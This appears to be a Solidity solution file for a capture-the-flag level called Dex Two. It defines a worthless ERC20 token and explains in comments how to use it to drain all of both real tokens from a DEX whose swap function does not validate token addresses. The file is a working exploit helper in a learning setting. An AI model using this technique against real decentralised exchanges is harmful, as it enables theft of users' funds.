// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


import {ERC20} from 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';


contract DexTwoAttackToken2  is ERC20{

    /**
    The problem of dex2 is when swap token, the swap funtion doesn't check the token0 and token1, So anyone can swap any token on their will.
    
    1. Create the DexTwoAttackToken2 contract, which transfer 1 token to dex2, 3 token to the players
    2: Swap the 1 DexTwoAttackToken2 to token0, because there are 100 token0 and 1 DexTwoAttackToken2 in dex2, so the player will get 100 token0
    3: Swap the 2 DexTwoAttackToken2 to token1, because there are 100 1 and 2 DexTwoAttackToken2 in dex2, so the player will get 100 token1
    
     */
    constructor(address dexInstance) ERC20("TEST","T") {
        _mint(msg.sender,3);
        _mint(dexInstance,1);

        approve(dexInstance, 3);
    }
}
